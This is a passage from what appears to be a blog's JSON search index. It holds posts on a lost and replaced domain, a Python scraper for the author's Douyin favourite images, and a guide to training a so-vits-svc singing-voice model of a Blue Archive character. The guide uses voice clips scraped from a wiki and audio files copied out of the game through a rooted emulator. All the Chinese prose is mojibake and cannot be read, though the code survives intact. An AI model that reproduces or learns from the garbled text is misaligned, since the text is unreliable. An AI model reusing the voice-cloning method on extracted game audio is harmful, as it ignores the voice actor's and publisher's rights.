æ³•è®¿é—®çš„æ—¶é—´è®©æˆ‘å‘ç°æˆ‘çš„åšå®¢å¯¹æˆ‘æ¥è¯´æœ‰å¤šä¹ˆçš„é‡è¦ã€‚è¿™ä¸¤ä¸ªæœˆæˆ‘æ€»æ˜¯æ— å¿ƒç ”ç©¶ï¼Œæ•´å¤©ä¸çŸ¥é“æ€ä¹ˆçš„æ—¶é—´å°±è¿‡å»äº†ï¼Œç„¶åå°±åˆ°æ™šä¸Šäº†ï¼Œç„¶åå°±ç¡è§‰ç¡åˆ°ç¬¬äºŒå¤©ä¸­åˆèµ·æ¥ç»§ç»­æ¶ˆç£¨æ—¶é—´ï¼Œè¿™ç§æ„Ÿè§‰å°±å’Œæˆ‘å½“æ—¶é«˜è€ƒå®Œä¹‹ååœ¨å®¶æ— æ‰€äº‹äº‹çš„æ„Ÿè§‰ç‰¹åˆ«ç›¸ä¼¼ï¼Œé‚£ä¸€ç§ä¸€æ•´å¤©æ²¡æœ‰ç›®æ ‡çš„æ„Ÿè§‰è®©æˆ‘æ„Ÿè§‰ç‰¹åˆ«çš„ä¸èˆ’æœ. ä¸€ä¸ªåšå®¢ä¸ä»…èƒ½è®©æˆ‘å³æ—¶è®°å½•ä¸‹ç°åœ¨å­¦åˆ°çš„çŸ¥è¯†ï¼Œæˆ‘æƒ³è¿™æ›´æ˜¯ä¸€ç§ç£ä¿ƒæˆ‘å»åšè‡ªå·±æƒ³è¦åšçš„äº‹æƒ…çš„æ–¹å¼ï¼Œå› ä¸ºåšå®¢æ˜¯æ”¾åœ¨äº’è”ç½‘ä¸Šå¤§å®¶éƒ½å¯ä»¥çœ‹åˆ°ï¼Œæ‰€ä»¥æˆ‘å°±ä¼šåœ¨å†…å¿ƒæš—æš—åŠªåŠ›è¦å¥½å¥½å»ç ”ç©¶ï¼Œå†™ä¸€äº›çœŸæ­£å¹²è´§çš„æ–‡ç« ç»™å¤§å®¶çœ‹. å½“ä¸Šå‘¨æˆ‘å‘ç°åŸŸåå·²ç»è¿›å…¥ç­‰å¾…åˆ é™¤æœŸï¼Œå³åŸŸåç»ˆäºè¦è¢«æ³¨å†Œå±€åˆ é™¤ï¼Œæˆ‘å¯ä»¥é‡æ–°åˆ°åä¸ºäº‘æ³¨å†Œçš„æ—¶å€™ï¼Œæˆ‘æ¯ä¸€å¤©ï¼Œæ•´å¤©æ•´å¤©çš„å»çœ‹ oacia.cc çš„ whois ä¿¡æ¯ï¼ŒæœŸå¾…ç€é‚£ä¸€å¤©æˆ‘é‡æ–°æ³¨å†Œåˆ° oacia.cc è¿™ä¸ªåŸŸåï¼Œå°±åœ¨ä»Šå¤©ï¼Œ12 æœˆ 12 å·ï¼Œå½“åŸŸåç»ˆäºè¢«æ³¨å†Œå±€åˆ é™¤ä¹‹åï¼Œå½“æˆ‘æ»¡å¿ƒæ¬¢å–œçš„ç™»å½•åä¸ºäº‘å‡†å¤‡ä¹°å›åŸŸåçš„æ—¶å€™ï¼Œæˆ‘æ„•ç„¶å‘ç°ï¼Œè¿™ä¸ªåŸŸååœ¨åå‡ åˆ†é’Ÿå‰ï¼Œå°±åœ¨ä»Šå¤©ä¸‹åˆäº”ç‚¹å°±è¢«å…¶ä»–äººæŠ¢å…ˆæ³¨å†Œäº† è¦è¯´ä¸éš¾å—è‚¯å®šæ˜¯å‡çš„ï¼Œå½“æ—¶æˆ‘æ„£åœ¨äº†ç”µè„‘å‰å¾ˆä¹…ï¼Œå¿ƒæƒ³ç€è¿™ä¸€å®šæ˜¯å‡çš„ï¼Œæˆ‘ä¹‹å‰æœç´¢è¿‡è¿™ä¸ªäºŒçº§åŸŸåï¼Œåªæœ‰ com æ˜¯è¢«æ³¨å†Œçš„ï¼Œå…¶ä»–çš„é¡¶çº§åŸŸåéƒ½æ˜¯æ²¡æœ‰è¢«æ³¨å†Œè¿‡çš„ï¼Œç…§ç†æ¥è¯´ç›¸å½“çš„å†·é—¨æ‰å¯¹ï¼Œä¸è¿‡æœ‰ç‚¹é—æ†¾å‘¢ï¼Œ oacia.cc è¿™ä¸ªé™ªä¼´äº†æˆ‘æ•´æ•´ä¸€å¹´çš„åŸŸåå°±ç¦»æˆ‘è€Œå»äº†ï¼Œå‘äº†ä¸€æ¡æ¨ç‰¹ä¹‹åæˆ‘ä¹Ÿåªèƒ½æš—è‡ªè‹¦ç¬‘ç€ï¼Œè°è®©æˆ‘æ…¢äººä¸€æ­¥å‘¢ï¼Œæˆ–è®¸æœ‰äººæ¯”æˆ‘æ›´éœ€è¦è¿™ä¸ªåŸŸåå‘¢ï½ ä¸è¿‡æˆ‘çš„åšå®¢çš„åŸŸåè¿˜ç­‰ç€å®šä¸‹æ¥å‘¢ï¼Œæ•´ç†äº†ä¸€ä¸‹å¿ƒæƒ…ï¼Œæˆ‘å»å¤–é¢èµ°äº†èµ°ï¼Œå‡ºé—¨åƒäº†å®Œç‰›ä¸¼é¥­ï¼Œæƒ³ç€ç©¶ç«Ÿç”¨ä»€ä¹ˆæ–°åŸŸåå¥½å‘¢ï¼Œä½†æ˜¯åœ¨é˜¿é‡Œäº‘ä¸Šä¸‹ç¿»çœ‹ï¼Œæˆ‘è¿˜æ˜¯å¯¹æˆ‘é‚£é€å»çš„è€åŸŸåå¿µå¿µä¸å¿˜ã€‚æˆ‘çœ‹åˆ°äº† oacia.life , è¿™æˆ–è®¸æ„ä¸ºæ–°ç”Ÿ. oacia.co , å’Œæˆ‘ä¹‹å‰çš„åŸŸåé•¿çš„å¯çœŸåƒå‘¢ï¼Œä½†æ˜¯æˆ‘ä¸ç”±å¾—ä¼¤æ„Ÿäº†èµ·æ¥ï¼Œç®—äº†çœ‹åˆ° co å®¹æ˜“è”æƒ³åˆ°å¤±å»çš„ cc , è¿˜æ˜¯æ¢ä¸€ä¸ªç½¢ã€‚éšåæˆ‘æƒ³ç€ä¸å¦‚ä¹°ä¸€ä¸ª com åŸŸåï¼Œè¿™ä¸ªé¡¶çº§åŸŸåå¬èµ·æ¥å°±ç›¸å½“çš„ä¸“ä¸šå‘ï¼Œä½†æ˜¯ oacia.com è¿™ä¸ªåŸŸåå·²ç»è¢«æ³¨å†Œæ‰äº†ï¼Œæƒ³ç€åé¢åŠ å‡ ä¸ªæ•°å­—æ€ä¹ˆæ ·ï¼Ÿä¸è¿‡æˆ‘ä¸€çœ‹åˆ°è¿™ä¸ªåŸŸåï¼Œæ„Ÿè§‰è‹±æ–‡ + æ•°å­—ä¸å¤ªå¥½çœ‹ï¼Œæ‰€ä»¥ä¹Ÿå°± pass æ‰äº† ç„¶åæˆ‘å°±å»ç ”ç©¶äº†ä¸€ä¸‹åˆ«äººçš„åŸŸåç»´æœ¯å¤§ä½¬çš„åšå®¢ weishu.me , oacia.me è¿™ä¸ªåŸŸåçœ‹èµ·æ¥ä¸é”™ï¼Œä½†æ˜¯æˆ‘åœ¨é˜¿é‡Œäº‘ï¼Œè…¾è®¯äº‘ï¼Œåä¸ºäº‘éƒ½æ‰¾ä¸åˆ°è¿™ä¸ªé¡¶çº§åŸŸåï¼Œæˆ‘çŒœåº”è¯¥æ˜¯å·²ç»ä¸‹æ¶äº†å§ï¼Œå› ä¸ºæˆ‘æŸ¥è¯¢äº†ä¸€ä¸‹ç»´æœ¯å¤§ä½¬çš„åšå®¢çš„ whois ä¿¡æ¯ï¼Œå‘ç°æ˜¯åœ¨é˜¿é‡Œäº‘æ³¨å†Œçš„. åæ¥æˆ‘çœ‹åˆ°äº† seeflower å¤§ä½¬çš„åšå®¢ seeflower.dev , è¿™ä¸ª dev å¬èµ·æ¥å¥½ä¸“ä¸šå‘ï¼Œè€Œä¸”æ„Ÿè§‰ä¹Ÿéå¸¸å¥‘åˆæˆ‘ä½œä¸º developer çš„è‡ªæˆ‘å®šä½ï¼ŒåŒæ—¶æˆ‘è§‰å¾—è¿™ä¸ªåŸŸååº”è¯¥ä¹Ÿè°•ç¤ºç€æˆ‘çš„ blog çš„å†…å®¹å‘å±•çš„è¶Šæ¥è¶Šä¸°å¯Œï¼Œè’¸è’¸æ—¥ä¸Šï¼ç»„åˆäº†ä¸€ä¸‹åŸŸåï¼Œ oacia.dev , å¤©å‘è¿™ä¸ªåŸŸåä¸€å¬å°±è¶…çº§ coooooooool ä½†æ˜¯åœ¨é˜¿é‡Œäº‘ï¼Œè…¾è®¯äº‘ï¼Œåä¸ºäº‘éƒ½ä¸èƒ½è´­ä¹°è¿™ä¸ªåŸŸåï¼Œéšåæˆ‘å°†ç›®å…‰è½¬å‘äº†å…¨çƒçš„åŸŸåæ³¨å†Œå•†ï¼Œgodaddy ä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› æ— æ³•è¿›å…¥ è¿™è¯¥æ€ä¹ˆåŠå‘¢ï¼Œæˆ‘ç›®å‰ä¸ºæ­¢å”¯ä¸€çŸ¥é“çš„å…¨çƒåŸŸåæ³¨å†Œå•†å°±æ˜¯ godaddy äº†ï¼Œè¿™ä¸ªæ—¶å€™åˆè½®åˆ° whois æŸ¥è¯¢æ´¾ä¸Šç”¨åœºäº†ï¼Œæˆ‘å‘ç° seeflower.dev æ˜¯åœ¨ namesilo æ³¨å†Œçš„ï¼Œè€Œæ›´åŠ æ·±å…¥çš„äº†è§£ä¹‹åï¼Œæˆ‘å‘ç° namesilo ç«Ÿç„¶å¯ä»¥ä½¿ç”¨æ”¯ä»˜å®å°±èƒ½æ”¯ä»˜ï¼Œå»æœç´¢äº†ä¸€ä¸‹ï¼Œ oacia.dev è¿™ä¸ªåŸŸåè¿˜æ²¡æœ‰è¢«æ³¨å†Œå‘¢ï¼äºæ˜¯æˆ‘èŠ±äº† 12 åˆ€ï¼Œå®é™…ä»˜äº† 86 å—æŠŠåŸŸåä¹°å›æ¥äº†ï¼Œä»Šæ™šé…å¥½ CNAME ä¹‹åï¼Œç­‰ä¸€ä¸¤å¤©å dns åŸŸåè§£æåŒæ­¥å®Œæˆä¹‹åï¼Œæˆ‘çš„åšå®¢ç»ˆäºèƒ½å†æ¬¡è¢«è®¿é—®åˆ°äº†ï¼ å›è¿‡å¤´æ¥ï¼Œå…œå…œè½¬è½¬ä¸¤ä¸ªæœˆï¼Œä¸ºäº†çœä¸‹æ¯å¹´ 30 å¤šå…ƒåŸŸåçš„è´¹ç”¨ï¼Œä¸ä»…åšå®¢åœæ‘†äº†ä¸¤ä¸ªæœˆä¹‹ä¹…ï¼Œæˆ‘æ„Ÿè§‰è‡ªå·±ä¹Ÿä¼¼ä¹é¢“åºŸäº†ä¸¤ä¸ªæœˆï¼ŒåŒæ—¶æˆ‘ä¹Ÿå¤±å»äº† oacia.cc è¿™ä¸ªé™ªä¼´æˆ‘ä¸€å¹´çš„åŸŸåï¼Œå¹¶ä¸”èŠ±äº†æ¯”åœ¨é˜¿é‡Œäº‘ç»­è´¹ oacia.cc åŸŸå (éœ€è¦æ¯å¹´ 75 å…ƒ) é«˜äº†åå¤šå…ƒçš„ä»·æ ¼ï¼Œåœ¨ namesilo åˆé‡æ–°è´­ä¹°äº†æ–°çš„åŸŸå oaica.dev (æ¯å¹´ 12 åˆ€ï¼Œçº¦åˆ 86 å…ƒ), ç°åœ¨æƒ³æ¥çœŸæ˜¯ä¸€æ®µçš„ç¥å¥‡çš„ç»å†ï¼Œåªæœ‰çœŸæ­£å¤±å»çš„æ—¶å€™ï¼Œæ‰ä¼šå‘ç°å®ƒæ›¾ç»å¯¹æˆ‘æ¥è¯´æœ‰å¤šä¹ˆçš„é‡è¦. äººç”Ÿä¸è¿‡æ˜¯ä¸€æ¬¡è·¯è¿‡ï¼Œä½•å¿…ä»€ä¹ˆéƒ½æŠ“ä½ä¸æ”¾ï¼Œç”¨å¿ƒäº«å—é€”ä¸­çš„é£æ™¯å°±å¥½. Bye, oacia.cc Hello, oacia.dev","categories":[],"tags":[]},{"title":"æŠ–éŸ³æ”¶è—å¤¹å›¾æ–‡æ‰¹é‡è·å–","slug":"douyin-favorites-pic","date":"2023-11-09T13:24:38.000Z","updated":"2023-11-13T14:42:20.582Z","comments":true,"path":"douyin-favorites-pic/","link":"","permalink":"https://oacia.dev/douyin-favorites-pic/","excerpt":"","text":"æœ€è¿‘æƒ³ç»™è‡ªå·±çš„åšå®¢å¤šå¢åŠ äº›å¥½çœ‹çš„å›¾ç‰‡å½“èƒŒæ™¯å›¾ï¼Œæ­£å¥½è¿™æ®µæ—¶é—´åˆ·æŠ–éŸ³çœ‹åˆ°äº†å¥½å¤šå¥½çœ‹çš„å›¾ç‰‡ï¼Œä¹ŸæŠŠä»–ä»¬ä¿å­˜åœ¨æ”¶è—å¤¹é‡Œé¢ï¼Œä½†æ˜¯æ­£å½“æˆ‘å…´è‡´å‹ƒå‹ƒçš„æƒ³æŠŠæˆ‘æ”¶è—å¤¹é‡Œé¢çš„å›¾ç‰‡ä¸‹è½½ä¸‹æ¥æ—¶ï¼Œå‘ç°å·¥ä½œé‡çœŸçš„çœŸçš„å¥½å¤§ï¼æ‰€ä»¥ç´¢æ€§å°±å†™ä¸ªå°è„šæœ¬æ¥è®©ç”Ÿæ´»æ›´åŠ è½»æ¾å’¯ï½ é¦–å…ˆæˆ‘ä»¬æ‰“å¼€ç½‘é¡µç‰ˆæŠ–éŸ³ï¼Œæ¥åˆ°æ”¶è—å¤¹ï¼Œç„¶åç–¯ç‹‚å‘ä¸‹æ‹‰ç›´åˆ°æ”¶è—å¤¹çš„åº•éƒ¨ ç„¶ååœ¨ç½‘é¡µä¸Š å³é”®-&gt;å¦å­˜ä¸º... æŠŠè¿™ä¸ª html ä¿å­˜ä¸º mhtml æ ¼å¼ æ¥ä¸‹æ¥å†™ä¸ªç®€å•çš„å°çˆ¬è™«ï¼ŒæŠ–éŸ³é‡Œé¢æ”¶è—çš„å›¾ç‰‡å°±ä¸‹è½½åˆ°ç”µè„‘ä¸Šå•¦ï½ import reimport requestsimport osfrom tqdm import tqdmheader = &#123; \"User-Agent\": \"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36\"&#125;def douyin_pic(pid): # è·å– json æ•°æ® p_id = \"https://m.douyin.com/web/api/v2/aweme/iteminfo/?reflow_source=reflow_page&amp;item_ids=&#123;&#125;&amp;a_bogus=\".format(pid) # print(p_id) p_rs = requests.get(url=p_id, headers=header).json() # print(p_rs) # æ‹¿åˆ° images ä¸‹çš„åŸå›¾ç‰‡ images = p_rs['item_list'][0]['images'] # åˆ›å»º pic æ–‡ä»¶å¤¹ if not os.path.exists('douyin/pic'): os.makedirs('douyin/pic') # ä¸‹è½½æ— æ°´å°ç…§ç‰‡ (éå† images ä¸‹çš„æ•°æ®) for index, im in enumerate(images): # æ¯ä¸€æ¡æ•°æ®ä¸‹é¢éƒ½æœ‰å››ä¸ªåŸå›¾é“¾æ¥è¿™è¾¹ç”¨çš„æ˜¯ç¬¬ä¸€ä¸ª p_req = requests.get(url=im['url_list'][0]) # print(p_req) # ä¿å­˜å›¾ç‰‡ # æ‹¿åˆ°æ–‡ä»¶çš„é•¿åº¦ï¼Œå¹¶æŠŠ total åˆå§‹åŒ–ä¸º 0 total = int(p_req.headers.get('content-length', 0)) # æ‰“å¼€å½“å‰ç›®å½•çš„ fname æ–‡ä»¶ (åå­—ä½ æ¥ä¼ å…¥) # åˆå§‹åŒ– tqdmï¼Œä¼ å…¥æ€»æ•°ï¼Œæ–‡ä»¶åç­‰æ•°æ®ï¼Œæ¥ç€å°±æ˜¯å†™å…¥ï¼Œæ›´æ–°ç­‰æ“ä½œäº† with open(f'douyin/pic/&#123;pid&#125;_&#123;str(index)&#125;.jpg', 'wb') as file, tqdm( total=total, unit='iB', desc=f\"&#123;pid&#125; ç¬¬&#123;index&#125;å¼ å›¾ç‰‡\", unit_scale=True, unit_divisor=1024, ) as bar: for data in p_req.iter_content(chunk_size=1024): size = file.write(data) bar.update(size) index += 1with open('my.mhtml', 'r') as f: data = f.read()data = data.strip().replace(\"=\", \"\")pic = re.findall(r'https://www.douyin.com/note/(\\d+)', data)for p in pic: try: douyin_pic(p) except: print(f\"pid &#123;p&#125; went wrong!!!\")","categories":[],"tags":[]},{"title":"I wanna hear your voice, hina","slug":"hina-AI-voice","date":"2023-11-06T09:31:57.000Z","updated":"2024-02-10T18:36:23.835Z","comments":true,"path":"hina-AI-voice/","link":"","permalink":"https://oacia.dev/hina-AI-voice/","excerpt":"","text":"å¾ˆå–œæ¬¢æ—¥å¥ˆçš„å£°éŸ³ï¼Œæ‰€ä»¥ç”¨è‡ªå·±çš„ç”µè„‘è®­ç»ƒäº† hina çš„å£°éŸ³æ¨¡å‹ï¼Œå¹¶è®©å¥¹å”±äº†ä¸€é¦–æ­Œ # python è™šæ‹Ÿç¯å¢ƒæ­å»º è¿™é‡Œæˆ‘ä½¿ç”¨çš„ Python ç‰ˆæœ¬ä¸º Python3.9 å®‰è£… virtualenv pip install virtualenvpip install virtualenvwrapper # è¿™æ˜¯å¯¹ virtualenv çš„å°è£…ç‰ˆæœ¬ï¼Œä¸€å®šè¦åœ¨ virtualenv åå®‰è£…åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ è¿™é‡Œæˆ‘åˆ›å»ºäº†åä¸º hina çš„è™šæ‹Ÿç¯å¢ƒ PS E:\\virtualenvs> virtualenv hinaè¿›å…¥è™šæ‹Ÿç¯å¢ƒ å‘½ä»¤è¡Œå‰é¢æœ‰ (hina) è¯´æ˜æˆ‘ä»¬å·²ç»è¿›å…¥äº†è¿™ä¸ªè™šæ‹Ÿç¯å¢ƒ PS E:\\virtualenvs> cd .\\hina\\Scripts\\PS E:\\virtualenvs\\hina\\Scripts> .\\activate(hina) PS E:\\virtualenvs\\hina\\Scripts># pytorch å®‰è£… é¦–å…ˆè¿›å…¥ pytorch å®˜ç½‘ ç„¶åè¾“å…¥ nvidia-smi å‘½ä»¤æŸ¥çœ‹ N å¡ (å¿…é¡»æ˜¯ N å¡ï¼A å¡æ˜¯ä¸è¡Œçš„) æ”¯æŒçš„æœ€å¤§ CUDA ç‰ˆæœ¬ï¼Œæˆ‘è¿™é‡Œæ˜¯ 12.2 ç„¶åè¿è¡Œ Run this Command ä¸­æ˜¾ç¤ºçš„å‘½ä»¤ pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121# so vits svc 5.0 ç¯å¢ƒæ­å»º ä¸‹è½½æºç  git clone https://github.com/PlayVoice/so-vits-svc-5.0.git --depth=1å®‰è£…é¡¹ç›®ä¾èµ– pip install -r .\\requirements.txtä¸‹è½½å…¶ä»–å¿…è¦æ–‡ä»¶ å› ä¸ºæœ‰æ–‡ä»¶éœ€è¦ä» google drive ä¸‹è½½ï¼Œæ‰€ä»¥è®°å¾—æŒ‚å¥½ä»£ç†å“¦ é¦–å…ˆä¸‹è½½ gdown å’Œ wget pip install gdown, wgetç„¶ååœ¨é¡¹ç›®æ–‡ä»¶å¤¹å†…æ–°å»º download.py å¹¶å°†ä¸‹é¢çš„ä»£ç  (æˆ‘å†™çš„ XD) å¤åˆ¶åˆ° download.py ä¸­ import gdownimport wgetimport osFile_DICT = &#123; # folder:https://drive.google.com/drive/folders/15oeBYf6Qn1edONkVLXe82MzdIi3O_9m3 # we only need best_model.pth.tar according to README.md \"Speaker-Encoder\": &#123; \"name\": \"best_model.pth.tar\", \"url\": \"1UPjQ2LVSIt3o-9QMKMJcdzT8aZRZCI-E\", \"output_path\": \"speaker_pretrain/best_model.pth.tar\", \"gdrive\": True &#125;, \"whisper-large-v2\": &#123; \"name\": \"large-v2.pt\", \"url\": \"https://openaipublic.azureedge.net/main/whisper/models/81f7c96c852ee8fc832187b0132e569d6c3065a3252ed18e56effd0b6a73e524/large-v2.pt\", \"output_path\": \"whisper_pretrain/\", \"gdrive\": False &#125;, \"hubert_soft model\": &#123; \"name\": \"hubert-soft-0d54a1f4.pt\", \"url\": \"https://github.com/bshall/hubert/releases/download/v0.1/hubert-soft-0d54a1f4.pt\", \"output_path\": \"hubert_pretrain/\", \"gdrive\": False &#125;, \"crepe full\": &#123; \"name\": \"full.pth\", \"url\": \"https://github.com/maxrmorrison/torchcrepe/raw/master/torchcrepe/assets/full.pth\", \"output_path\": \"crepe/assets\", \"gdrive\": False &#125;, \"pretrain model\": &#123; \"name\": \"sovits5.0.pretrain.pth\", \"url\": \"https://github.com/PlayVoice/so-vits-svc-5.0/releases/download/5.0/sovits5.0.pretrain.pth\", \"output_path\": \"vits_pretrain/\", \"gdrive\": False &#125;&#125;def main(): REPO_PATH = (os.path.dirname(os.path.abspath(__file__))) try: for key, value in File_DICT.items(): path = os.path.join(REPO_PATH, value[\"output_path\"]) print(\"Downloading &#123;&#125; to &#123;&#125;...\".format(value[\"name\"], path)) if value[\"gdrive\"]: gdown.download(id=value[\"url\"], output=path, quiet=False) print(\"Done!\") else: wget.download(value[\"url\"], out=path) print(\"\\nDone!\") except Exception as e: print(\"[!] Exception in download_binaries\\n&#123;&#125;\".format(e))if __name__ == \"__main__\": main()éšååœ¨è™šæ‹Ÿç¯å¢ƒä¸­è¿è¡Œ download.py å°±å¯ä»¥å•¦ (hina) PS E:\\AI\\so-vits-svc-5.0> python .\\download.pyè¿è¡Œå¦‚ä¸‹å‘½ä»¤æµ‹è¯•ç¯å¢ƒæ˜¯å¦æ­å»ºæˆåŠŸ python svc_inference.py --config configs/base.yaml --model ./vits_pretrain/sovits5.0.pretrain.pth --spk ./configs/singers/singer0001.npy --wave test.wavåœ¨å½“å‰ç›®å½•ä¸‹å‡ºç° svc_out.wav å°±è¯´æ˜å¯ä»¥æ­£å¸¸ä½¿ç”¨å•¦ # è·å– hina çš„å£°éŸ³ # ä» gamekee ä¸­è·å– åœ¨ gamekee ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è·å– hina çš„éŸ³é¢‘ï¼Œæˆ‘ä»¬åªéœ€è¦å†™ä¸€ä¸ªéå¸¸ easy çš„ python ä»£ç æ¥æŠŠ hina çš„å£°éŸ³ä¸‹è½½ä¸‹æ¥ import requestsimport reimport wgetimport osHINA = &#123; \"hina_water\":\"https://ba.gamekee.com/83729.html\",#æ—¥å¥ˆ - æ°´ç€ \"hina\":\"https://ba.gamekee.com/59934.html\"#æ—¥å¥ˆ&#125;for key,value in HINA.items(): if not os.path.exists(key): os.mkdir(key) data = requests.get(value) voices = re.findall(r'src=\"//(.*?\\.(?:mp3|wav))\"', data.text) for v in voices: wget.download(\"http://\"+v,key) print(f\"download &#123;v&#125; success\")# ä»æ¸¸æˆèµ„æºä¸­è·å– ç”±äº hina æ˜¯è”šè“æ¡£æ¡ˆä¸­çš„è§’è‰²ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°† hina çš„éŸ³é¢‘èµ„æºä»æ¸¸æˆæ–‡ä»¶ä¸­æå–å‡ºæ¥ï¼Œé¦–å…ˆè¦åšçš„å°±æ˜¯åœ¨æ¨¡æ‹Ÿå™¨ä»è°·æ­Œå•†åº—ä¸­ä¸‹è½½è”šè“æ¡£æ¡ˆï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ¨¡æ‹Ÿå™¨æ˜¯é›·ç”µæ¨¡æ‹Ÿå™¨ ç„¶ååœ¨ è®¾ç½®-&gt;å…¶ä»–è®¾ç½® ä¸­å¼€å¯ ROOTæƒé™ ç„¶åæˆ‘ä»¬åœ¨ä¾§è¾¹æ æ‰¾åˆ° æ›´å¤š-&gt;å…±äº«æ–‡ä»¶-&gt;æ‰“å¼€å®‰å“æ–‡ä»¶å¤¹ ï¼Œæ‰¾åˆ°å®‰å“å…±äº«æ–‡ä»¶å¤¹æ–‡ä»¶åä¸º /mnt/shared/Pictures éšåå®‰è£… MT ç®¡ç†å™¨å¹¶æ‰“å¼€ï¼Œåœ¨å³ä¾§è¾¹æ è¿›å…¥ mnt/shared/Pictures åœ¨å·¦ä¾§è¾¹æ è¿›å…¥ /storage/emulated/0/Android/data , æ‰¾åˆ°æ–‡ä»¶å¤¹åç§°ä¸º com.nexon.bluearchive , è¿™ä¸ªæ–‡ä»¶å¤¹æ˜¯è”šè“æ¡£æ¡ˆå…¨éƒ¨éŸ³é¢‘å›¾ç‰‡èµ„æºæ–‡ä»¶çš„æ‰€åœ¨ä½ç½®ï¼Œé•¿æŒ‰è¯¥æ–‡ä»¶å¤¹ï¼Œå¹¶é€‰æ‹© å¤åˆ¶-&gt; ç­‰åˆ°å¤åˆ¶å®Œæˆä¹‹åï¼Œåœ¨ä¾§è¾¹æ ç‚¹å‡» æ›´å¤š-&gt;å…±äº«æ–‡ä»¶-&gt;æ‰“å¼€ç”µè„‘æ–‡ä»¶å¤¹ å³å¯æ‰¾åˆ°ä¿å­˜åˆ°ç”µè„‘ä¸Šçš„è”šè“æ¡£æ¡ˆèµ„æºæ–‡ä»¶ï½ éšåæˆ‘ä»¬è¿›å…¥åˆ° com.nexon.bluearchive\\files\\PUB\\Resource\\GameData\\MediaResources\\Audio\\VOC_JP\\JP_Hina , è¿™é‡Œå°±æ˜¯ hina çš„å…¨éƒ¨éŸ³é¢‘å•¦ ç”±äºè·å–åˆ°çš„æ˜¯ ogg æ ¼å¼çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ ¼å¼å·¥å‚æŠŠ ogg æ–‡ä»¶å…¨éƒ¨è½¬æ¢æˆ wav æ–‡ä»¶ ç„¶ååœ¨æ–°å»ºä¸€ä¸ª so-vits-svc-5.0\\dataset_raw\\JP_Hina æ–‡ä»¶å¤¹ï¼Œå¹¶å°†æˆ‘ä»¬è½¬æ¢å®Œæˆçš„ hina çš„éŸ³é¢‘å¤åˆ¶åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ # æ•°æ®é¢„å¤„ç† python svc_preprocessing.py -t 2-tï¼šæŒ‡å®šçº¿ç¨‹æ•°ï¼Œå¿…é¡»æ˜¯æ­£æ•´æ•°ä¸”ä¸å¾—è¶…è¿‡ CPU æ€»æ ¸å¿ƒæ•°ï¼Œä¸€èˆ¬å†™ 2 å°±å¯ä»¥äº† è¿›é˜¶å‘½ä»¤ é‡é‡‡æ · ç”Ÿæˆé‡‡æ ·ç‡ 16000Hz éŸ³é¢‘ï¼Œå­˜å‚¨è·¯å¾„ä¸ºï¼š./data_svc/waves-16k python prepare/preprocess_a.py -w ./dataset_raw -o ./data_svc/waves-16k -s 16000 ç”Ÿæˆé‡‡æ ·ç‡ 32000Hz éŸ³é¢‘ï¼Œå­˜å‚¨è·¯å¾„ä¸ºï¼š./data_svc/waves-32k python prepare/preprocess_a.py -w ./dataset_raw -o ./data_svc/waves-32k -s 32000 ä½¿ç”¨ 16K éŸ³é¢‘ï¼Œæå–éŸ³é«˜ python prepare/preprocess_crepe.py -w data_svc/waves-16k/ -p data_svc/pitch ä½¿ç”¨ 16k éŸ³é¢‘ï¼Œæå–å†…å®¹ç¼–ç  python prepare/preprocess_ppg.py -w data_svc/waves-16k/ -p data_svc/whisper ä½¿ç”¨ 16k éŸ³é¢‘ï¼Œæå–å†…å®¹ç¼–ç  python prepare/preprocess_hubert.py -w data_svc/waves-16k/ -v data_svc/hubert ä½¿ç”¨ 16k éŸ³é¢‘ï¼Œæå–éŸ³è‰²ç¼–ç  python prepare/preprocess_speaker.py data_svc/waves-16k/ data_svc/speaker æå–éŸ³è‰²ç¼–ç å‡å€¼ï¼›ç”¨äºæ¨ç†ï¼Œä¹Ÿå¯ä½œä¸ºå‘éŸ³äººç»Ÿä¸€éŸ³è‰²ç”¨äºç”Ÿæˆè®­ç»ƒç´¢å¼•ï¼ˆæ•°æ®éŸ³è‰²å˜åŒ–ä¸å¤§çš„æƒ…å†µä¸‹ï¼‰ python prepare/preprocess_speaker_ave.py data_svc/speaker/ data_svc/singer ä½¿ç”¨ 32k éŸ³é¢‘ï¼Œæå–çº¿æ€§è°± python prepare/preprocess_spec.py -w data_svc/waves-32k/ -s data_svc/specs ä½¿ç”¨ 32k éŸ³é¢‘ï¼Œç”Ÿæˆè®­ç»ƒç´¢å¼• python prepare/preprocess_train.py è®­ç»ƒæ–‡ä»¶è°ƒè¯• python prepare/preprocess_zzz.py # è®­ç»ƒ å‚æ•°è°ƒæ•´ å¦‚æœåŸºäºé¢„è®­ç»ƒæ¨¡å‹å¾®è°ƒï¼Œéœ€è¦ä¸‹è½½é¢„è®­ç»ƒæ¨¡å‹ sovits5.0.pretrain.pth å¹¶ä¸”æ”¾åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹é¢ å¹¶ä¸”ä¿®æ”¹ configs/base.yaml çš„å‚æ•° pretrain: &quot;./vits_pretrain/sovits5.0.pretrain.pth&quot; ï¼Œå¹¶é€‚å½“è°ƒå°å­¦ä¹ ç‡ï¼ˆå»ºè®®ä» 5e-5 å¼€å§‹å°è¯•ï¼‰ learning_rate &amp; batch_size &amp; accum_step ä¸ºä¸‰ä¸ªç´§å¯†ç›¸å…³çš„å‚æ•°ï¼Œéœ€è¦ä»”ç»†è°ƒèŠ‚ batch_size ä¹˜ä»¥ accum_step é€šå¸¸ç­‰äº 16 æˆ– 32ï¼Œå¯¹äºä½æ˜¾å­˜ GPUï¼Œå¯ä»¥å°è¯• batch_size = 4ï¼Œaccum_step = 4 å¼€å§‹è®­ç»ƒ python svc_trainer.py -c configs/base.yaml -n sovits5.0 æ¢å¤è®­ç»ƒ python svc_trainer.py -c configs/base.yaml -n sovits5.0 -p chkpt/sovits5.0/sovits5.0_0***.pt è®­ç»ƒæ—¥å¿—å¯è§†åŒ– tensorboard --logdir logs/ # äººå£°ä¼´å¥åˆ†ç¦» æƒ³è®© hina 